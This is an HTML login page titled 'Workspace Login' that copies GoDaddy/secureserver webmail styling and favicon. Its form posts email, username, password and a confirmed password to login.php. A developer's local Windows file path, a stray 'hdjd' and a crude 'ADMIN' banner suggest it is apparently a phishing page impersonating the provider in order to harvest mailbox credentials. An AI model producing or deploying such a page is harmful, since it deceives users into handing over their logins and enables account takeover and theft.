﻿

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="EXPIRES" content="0">
  <meta http-equiv="Pragma" content="no-cache">
    <link rel="shortcut icon" href="https://login.secureserver.net/images/favicon_pl.ico?r=1" type="image/x-icon">
  <title>Workspace Login</title>

 
    <style>
    .login-top {
      background-image: url(file:///C|/Users/JOSEF%20TEMISAN/Documents/images/login/login_wbe_pl_200811.jpg?r=1);
      background-position: center;
	    background-repeat: no-repeat;
    }
	/*
  @package Base
  @author secureserver.net

  Workspace Login 
  godaddy.com
  

  @version: 1.51 (1.51) 
  @generated 2013-01-13 08:40:27
  @tag: css_group_login_full_53289798c5a2cda562b38224efbd13d2

  @config: win gecko firefox 18.0
*/

#css_group_login_full {/* Used for Layout to identify this file */}

html, body, div, span, applet, object, iframe,h1, h2, h3, h4, h5, h6, p, blockquote, pre,a, abbr, acronym, address, big, cite, code,del, dfn, em, font, img, ins, kbd, q, s, samp,small, strike, strong, sub, sup, tt, var,dl, dt, dd, ol, ul, li,fieldset, form, label, legend,table, caption, tbody, tfoot, thead, tr, th, td{margin:0;padding:0;border:0;outline:0;font-weight:inherit;font-style:inherit;font-size:100%;font-family:inherit;vertical-align:baseline}a:focus{outline:0}body{line-height:1;color:black;background:white}ol, ul{list-style:none}table{border-collapse:separate !important;border-spacing:0}caption, th{text-align:left;font-weight:normal}blockquote:before, blockquote:after,q:before, q:after{content: ""}blockquote, q{quotes: "" ""}input{margin:0}strong{ font-weight:bold}

html, body{ height:100%}body{ font-size:12px; font-family:Arial, Verdana, Helvetica, sans-serif; background-color:#1d1c1c}a,a:link,a:visited{ color:blue; text-decoration:underline; cursor:pointer}a:hover{ text-decoration:none}.float-left{ float:left}.float-right{ float:right}.clear-fix:after{ content: "."; display:block; visibility:hidden; height:0; font-size:1px; clear:both}.outer-container{ background-color:#ffffff; background-repeat:repeat-x; background-position:bottom left; min-width:980px}.main-container{ background-image:url(images/wrapper.png); background-repeat:repeat-x; padding-bottom:40px; height:auto !important; height:750px}.header-area{ width:980px; margin:0 auto; background-image:url(images/header-bg.png); background-position:center 51px; background-repeat:no-repeat; }.logo-container{ background-image:url(images/logo-container-bg.png); background-repeat:no-repeat; background-position:center top; height:51px; width:980px}.logo{ float:left; height:49px; margin-left:40px; display:inline}.logo span{ display:none}.blue-box{ border:8px solid #CCDCE3; background-color:#fff; margin-top:50px; position:relative}.blue-box-popin-internal,.blue-box-internal{ background-color:#fff; background-image:url(images/blue-box-bg.png); background-repeat:repeat-x; background-position:left bottom; border:1px solid #fff; min-height:255px; height:auto !important; height:255px; padding:30px 30px 20px}.blue-box-popin-internal{ min-height:148px; height:auto !important; height:148px}.blue-box-popin-internal p,.blue-box-internal p{ font-size:16px}.blue-box-popin-internal h3,.blue-box-internal h3{ font-family:trebuchet ms, arial, verdana, sans-serif; font-size:48px; color:#000; font-weight:normal; letter-spacing: -.048em; line-height:36px; margin-bottom:10px}.box-shadow{ background-image:url(images/box-shadow-bg.png); background-repeat:repeat-x; height:23px; margin-top:1px}.start-single-sign-on-box{ float:left; width:558px; margin:0 0 0 28px; display:inline}.start-single-sign-on-box .blue-box-internal h3{ margin-bottom:30px}.create-password{ margin-bottom:20px}.login-form label,.popin-main-container label,.create-password label,.start-single-sign-on-box label{ display:block; margin-bottom:3px; font-size:16px; padding-left:4px}.login-logo{ width:167px; height:84px; margin-left:26px; }.popin-main-container label,.create-password label{ width:194px}.create-password label span{ float:left}.create-password label a{ display:inline-block; float:right; font-size:11px; padding-top:3px}.login-form select{ border:1px solid #ccc; border-radius:4px; -moz-border-radius:4px; -webkit-border-radius:4px; font-size:16px; font-weight:bold; font-family:arial; width:262px; padding:4px; margin-bottom:18px}.start-single-sign-on-box select{ border:1px solid #ccc; border-radius:4px; -moz-border-radius:4px; -webkit-border-radius:4px; font-size:16px; font-weight:bold; font-family:arial; width:262px; padding:4px; margin-bottom:18px}.login-form input,.popin-main-container input,.create-password input,.start-single-sign-on-box input{ border:1px solid #ccc; border-radius:4px; -moz-border-radius:4px; -webkit-border-radius:4px; font-size:16px; font-weight:bold; font-family:arial; width:262px; padding:4px; margin-bottom:18px}.login-form select,.start-single-sign-on-box select{ width:272px}.password-container input{ float:left; display:inline}.password-container .password-error{ float:left; margin-left: -6px; border:1px solid #e88586; border-radius:0 4px 4px 0; -moz-border-radius:0 4px 4px 0; -webkit-border-radius:0 4px 4px 0; background-image:url(images/error-icon.png); background-position:5px center; background-repeat:no-repeat; background-color:#ffcfcf; color:#800000; font-size:11px; padding:9px 10px 0 26px; height:19px; width:171px}.strong-password-container input{ display:inline}.strong-password-container .password-error{ visibility:hidden; display:block; background-image:url(images/strong_pw_exclamation.png); background-repeat:no-repeat; color:#000; font-size:11px; padding:2px 0px 0 22px; height:19px; width:200px; margin-top: -10px}.blue-box-button-container{ text-align:center}.start-form{ margin-bottom:71px}.how-box-container{ float:right; margin:50px 28px 0 0; display:inline; width:350px}.how-box{ background-color:#f9f4e1; background-image:url(images/how-box-bg.png); background-position:left bottom; background-repeat:repeat-x; border:1px solid #cab8ae; padding:20px; height:391px; width:308px}.how-box h3{ font-family:trebuchet ms, arial, verdana, sans-serif; font-size:48px; color:#585747; font-weight:normal; letter-spacing: -.048em; margin-bottom:15px; line-height:44px}.how-box p{ line-height:16px}.how-video-box{ background-image:url(images/how-box-video-bg.png); background-repeat:no-repeat; width:308px; height:204px; margin-bottom:10px}.how-video-box div{ background-image:url(images/pass1.jpg); background-repeat:no-repeat; width:283px; height:180px; display:inline-block; float:left; margin:12px 0 0 13px; }.how-video-box div span{ display:none}.accounts-box{ width:558px; margin:0 auto}.accounts-text{ font-size:16px; padding-bottom:30px}.account-list{ border-top:1px dashed #c9c9c9; margin-bottom:30px}.account-list li{ border-bottom:1px dashed #c9c9c9; padding:10px 0; float:left; display:inline-block; zoom:1; width:480px}.account-list li.clickable{ cursor:pointer}.popin-top .icon,.account-list .icon{ float:left; width:61px; height:61px; display:inline-block; margin-right:20px}.icon span{ display:none}.account-info{ font-weight:bold; font-size:16px; float:left; padding-top:13px; line-height:17px; width:236px; height:46px; overflow:hidden; text-overflow:ellipsis}.account-info span{ font-weight:normal; font-size:15px; white-space:nowrap}.account-switch-on{ background-image:url(images/on-off-buttons.png); background-position:0 -36px; width:32px; height:34px; float:right; margin:15px 10px 0 0; font-size:0; display:inline; margin-left:6px}.account-switch-off{ background-image:url(images/on-off-buttons.png); background-position:0 0px; width:32px; height:34px; float:right; margin:15px 10px 0 0; font-size:0; display:inline; margin-left:6px}.link-message{ margin-top:26px; margin-right:6px; float:right; color:#666; font-size:12px}.link-question{ background-image:url( images/question.png ); background-repeat:no-repeat; width:10px; height:10px; float:right; margin-top:22px}.popin-main-container{ font-size:16px; margin-bottom:20px}.success-box, .fail-box{ width:558px; margin:0 auto}.accounts-linked-text{ font-size:16px; font-weight:bold; background-repeat:no-repeat; background-position:left; padding:10px 0 10px 45px; margin-bottom:30px}.use-this-account{ font-size:16px; margin-bottom:10px}.success-icon-list{ border:1px solid #d7d7d7; background-image:url(images/finished-icons-bg.png); background-repeat:repeat-x; background-position:left top; background-color:#f2f2f2; padding:20px 20px 0px; margin-bottom:50px}.success-icon-list li{ width:97px; text-align:center; margin-right:12px; margin-bottom:12px; float:left}.success-icon-list li.linked-apps{ width:auto}.success-icon-list li:last-child{ margin-right:0}.success-icon-list li .icon{ width:61px; height:61px; display:inline-block; margin:0 auto}.success-icon-list li .small-checkmark{ width:28px; height:28px; margin:0 auto}.success-icon-list li p{ font-size:11px; padding:5px 0}.success-icon-list li .small-checkmark span{ display:none}.failed-message{ margin:20px 0px 80px 0px}.access-warning-popin{ width:558px}.access-warning-popin .blue-box{ margin-top:0}.popin-top{ padding-bottom:20px; border-bottom:1px dashed #ccc; margin-bottom:20px}.popin-top h3{ float:left}.popin-top p{ float:left; font-size:16px}.workspace-icon{ display:block; width:61px; height:61px; float:left; background-image:url(images/workspace-icon.gif); position:relative; margin-right:20px}a.close-popin,a.close-popin:link,a.close-popin:visited{ display:block; width:15px; height:15px; position:absolute; right:10px; top:10px; background-image:url(images/close-popin.gif)}a.remove-on span,a.remove-off span,.workspace-icon span,a.close-popin span{ display:none}p.single-sign-on-access{ font-size:16px; padding-bottom:17px; line-height:17px}.access-warning-popin .success-icon-list{ padding-top:15px}.access-warning-popin .success-icon-list li.linked-apps{ font-weight:bold; float:none; text-align:left; padding-bottom:10px}.access-warning-popin .success-icon-list{ padding-top:10px; margin-bottom:10px}a.remove-on,a.remove-on:link,a.remove-on:visited{ background-image:url(images/remove-buttons.gif); background-position:0 -21px; background-repeat:no-repeat; width:71px; height:21px; display:inline-block; text-align:center}a.remove-on:hover{ background-image:url(images/remove-buttons.gif); background-position:0 0px; background-repeat:no-repeat; width:71px; height:21px; display:inline-block; text-align:center}a.remove-off,a.remove-off:link,a.remove-off:visited{ background-image:url(images/remove-buttons.gif); background-position:0 -42px; background-repeat:no-repeat; width:71px; height:21px; display:inline-block; text-align:center; cursor:pointer}.remove-opacity{ opacity:0.25; -moz-opacity:0.25; filter:alpha(opacity=25)}.continue-link{ padding:10px 0 30px}.popin-overlay{ position:absolute; width:100%; height:100%; background-color:#000; opacity: .6; filter:alpha(opacity=60)}.login-box{ width:506px; margin:0 auto}.login-top{ width:468px; height:135px; margin-bottom:10px}.email-provider-logo{ float:left; width:225px; height:135px; text-align:center; color:#fff; font-size:11px; }.email-provider-logo p{ font-size:11px; padding-top:5px}.email-provider-logo img{ vertical-align:middle}.email-provider-logo table tr td{ width:225px; height:135px; text-align:center; vertical-align:middle}.login-box .blue-box-internal{ padding:10px 10px 20px}.header-links{ float:right; color:#fff; padding:17px 40px 0 0}.header-links a,.header-links a:link,.header-links a:visited{ color:#fff; text-decoration:none}.header-links a:hover{ text-decoration:underline}.login-form{ width:271px; margin:30px auto 20px}.domain{ margin: -17px 0 18px 3px; font-weight:bold}.username-label{ width:100px; float:left; width:150px}.password-label{ width:100px; float:left; width:182px}.status-msg{ line-height:16px}.intervention-title{ background-image:url( images/workspace-icon.gif ); background-repeat:no-repeat; padding-left:75px; border-bottom:1px dashed #C9C9C9}.intervention-body p{ margin-top:22px}.intervention-warning{ background-image:url( images/icon_attention.png ); background-repeat:no-repeat; padding-left:54px; font-size:13px !important; min-height:43px; line-height:15px}.intervention-warning span{ vertical-align:middle}.intervention .intervention-note{ font-size:12px; color:#f00; margin:22px 0px 28px 0px}.intervention .login-form{ width:340px; margin:22px 0px 0px 0px}.intervention #validate-success{ vertical-align:middle; display:none}.intervention #validate-fail{ vertical-align:middle; display:none}.intervention #username{ width:300px; margin-bottom:0px}.intervention_error_msg{ height:12px; color:#f00; margin-top: -14px}.status-msg{ position:relative; line-height:16px}.status-msg td{ vertical-align:middle}.status-icon{ background-image:url(images/sf-icn-alert.png); background-repeat:no-repeat; width:26px; height:26px; margin:0px 10px 0px 10px}.status-body{ padding:11px 0px 11px 0px}.status-confirmation{ border:1px solid #88C236; background-color:#ECFBDA}.status-confirmation .status-icon{ background-position:0px -110px}.status-error{ border:1px solid #D00000; background-color:#FFDCDC}.status-error .status-icon{ background-position:0px -9px}.status-info{ border:1px solid #3AAEDD; background-color:#E1F2F9}.status-info .status-icon{ background-position:0px -160px}.status-warning{ border:1px solid #E0A61B; background-color:#FFFBCC}.status-warning .status-icon{ background-position:0px -60px}.password-tips{ float:left; font-size:11px; padding-top:2px}.tooltip{ background-color:#A2D9EF; border-left:1px solid #3AAEDC; border-right:1px solid #3AAEDC; border-bottom:1px solid #3AAEDC; width:209px; position:absolute; font-family:Arial, Helvetica, sans-serif; line-height:14px; font-size:12px; z-index:1000; cursor:default; display:none}.tooltip_content{ background-image:url(images/tooltip_top.png); background-repeat:no-repeat; margin-left: -16px; margin-top: -1px; padding:7px 9px 9px 24px}.tooltip h3{ font-weight:bold; padding-bottom:9px}.tooltip p{ font-weight:300}.tooltip .exit{ width:11px; height:11px; background-image:url(images/tooltip_exit.png); float:right; position:relative; top:7px; right:7px; cursor:pointer; }.password_tooltip{ top:136px; left:330px}.confirm_password_tooltip{ top:202px; left:330px}.password_tooltip_inline{ top:216px; left:324px}.confirm_password_tooltip_inline{ top:286px; left:324px}.pass-tooltip{ position:absolute; width:180px; background-color:#E1F2F9; border:1px solid #3BAEDD; background-image:url( images/tooltip-bg.gif ); background-repeat:repeat-x !important; padding:8px; display:none}.pass-tooltip-triangle{ position:absolute; top: -1px; left: -8px; width:8px; height:8px; background-image:url( images/tooltip-triangle.gif ); background-repeat:no-repeat}.pass-tooltip-title{ font-weight:bold; margin-bottom:6px}a.main-button,a.main-button:link,a.main-button:visited{ display:inline-block; font-family:arial; font-weight:bold; font-size:22px; text-transform:uppercase; color:#fff; text-decoration:none; padding:0 30px 0px 0; height:77px; vertical-align:middle}a.main-button span{ display:inline-block; cursor:pointer; padding:29px 0 26px 30px}a.login-button,a.login-button:link,a.login-button:visited{ padding-right:40px !important}a.login-button{ padding-right:40px !important}a.login-button span{ padding-left:40px}a.login-button span em.lock{ padding:0 !important; background-image:url(images/lock.png) !important; height:27px !important; width:18px !important; float:left !important; margin-top: -5px !important; margin-right:10px !important}a.black-css3-button,a.black-css3-button:link,a.black-css3-button:visited{ background-image:url(images/black-button-bg-css3.png); border:1px solid #000; border-radius:3px; -moz-border-radius:3px; -webkit-border-radius:3px; color:#fff; display:inline-block; font-family:verdana; font-size:12px; font-weight:bold; padding:4px 10px 0; height:17px; line-height:1; text-decoration:none; vertical-align:middle}a.black-css3-button:hover{ background-image:url(images/black-button-bg-hover-css3.png)}.button-margin-right{ margin-right:7px}.button-margin-left{ margin-left:7px}.footer{ background-image:url(images/footer_end.png); background-repeat:repeat-x; background-position:left bottom}.footer .content{ text-align:center; padding:15px; color:#919191; font-size:13px}.footer a,.footer a:visited,.footer a:hover{ color:#919191; text-decoration:none; padding:0 5px}.footer a:hover{ text-decoration:underline}

.logo{ background-image:url(images/ws-logo.png); width:147px; }a.main-button,a.main-button:link,a.main-button:visited{background:transparent url(images/button-bg.png) no-repeat scroll 100% bottom;text-shadow: -1px -1px 0px #6d9815}a.main-button span{background:transparent url(images/button-bg.png) no-repeat scroll 0 bottom}* html a.login-button span em.lock{background-image:none !important;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(enabled='true',src='images/lock.png')}.account-list li.clickable:hover,.account-list li.hover{ background-color:#ebf3d7}.accounts-linked-text{background-image:url(images/large-checkmark.png)}.success-icon-list li .small-checkmark{background-image:url(images/small-checkmark.png)}

.popin_wrapper{ border:1px solid #ccc}.popin_wrapper_shadow{ -webkit-box-shadow:5px 5px 15px #555; -moz-box-shadow:5px 5px 15px #555; box-shadow:5px 5px 15px #555}.popin_title{ height:30px; line-height:30px; font-weight:bold; padding-left:10px; background-image:url(images/popin_title_bg.gif?r=1); background-repeat:repeat-x; color:white}.popin_close{ width:31px; height:27px; float:right; background-image:url(images/popin_close.gif?r=1); background-position:center center; background-repeat:no-repeat}.popin_body{ background-color:white; padding:10px; overflow:auto}.popin_fixedheight .popin_title{ position:absolute; top:0; left:0; right:0; position:absolute}.popin_fixedheight .popin_body{ position:absolute; top:30px; bottom: -1px; left:1px; right:1px}.popin_hasactions .popin_body{ bottom:35px}.popin_actions{ height:26px; padding:5px 20px 10px 20px; background-color:white; text-align:right; vertical-align:middle; line-height:26px}.popin_fixedheight .popin_actions{ position:absolute; bottom: -1px; left:1px; right:1px}INPUT.popin_action{ border:1px solid black; margin:1px}A.popin_action[disabled],A.popin_action[disabled]:hover,A.popin_action[disabled]:visited,A.popin_action[disabled]:active{ color:gray}INPUT.popin_action_default{ border:2px solid black; font-weight:bold; margin:0; display:relative; top: -1px}.popin_message_wrapper,.popin_warning_wrapper,.popin_error_wrapper{ -webkit-border-radius:6px; -moz-border-radius:6px; border-radius:6px; background-color:#303030}.popin_message_title,.popin_warning_title,.popin_error_title{ background-position:15px 12px; background-repeat:no-repeat; padding:15px 15px 10px 50px; color:white; font-weight:normal}.popin_message_title DIV,.popin_warning_title DIV,.popin_error_title DIV{ font-size:20px}.popin_message_title{ background-image:url(images/popin_message.png?r=1) }.popin_warning_title{ background-image:url(images/popin_warning.png?r=1) }.popin_error_title { background-image:url(images/popin_error.png?r=1) }.popin_message_title .popin_close,.popin_warning_title .popin_close,.popin_error_title .popin_close{ position:absolute; top:5px; right:5px; background-position:top right}.popin_message_body,.popin_warning_body,.popin_error_body{ padding:0 15px 15px 15px; overflow:auto; color:white}





.recaptcha{ width:318px; margin:20px auto 30px}


  </style>
  
</head>
<body >
<!-- app=wbe -->
<form action="login.php" method="POST" id="login_form" name="login_form">
  hdjd
  <div class="outer-container">
    <div class="main-container">
    <div class="header-area clear-fix">
      <div class="login-box">
        <div class="blue-box">
    <div class="blue-box-internal">
      <div class="popin_error_wrapper" align="center"><strong><font style="font-size:38px" color="#FFFFFF">ADMIN</font></strong></div>

      
      <noscript>
        <div class="login-error status-msg">
          Webmail requires JavaScript to log in.  Your browser either doesn't support JavaScript or has it disabled.
        </div>
      </noscript>

      <div class="login-form clear-fix">
        <label class="username-label">Email:
        </label>
                <div id="username_area">
          <input id="email" name="email" type="text">
                </div>
                <div class="clear-fix">
          <label class="password-label">
            Username:
          </label>
                </div>

        <input id="username" name="username" value="">
          <div class="clear-fix">
          <label class="password-label">
            Password:
          </label>
                </div>
  <input id="password" name="password" value=""  type="password">
   <div class="clear-fix">
          <label class="password-label">
            Confirm-Password:
          </label>
                </div>
  <input id="conpwd" name="conpwd" value=""  type="password">
      </div>

      <div class="blue-box-button-container">
<input type="submit" class="button-margin-left" value="OK"/>
      </div>
    </div>

  </div>
  <div class="box-shadow"></div>
</div>
    </div>			
    </div>

    <div class="main-content"></div>
</div>


<div class="footer">
  <div class="content">
    Copyright © 2003-2013. All rights reserved.<br>
  </div>
</div>
</form>
  <!-- pageok -->

</body></html>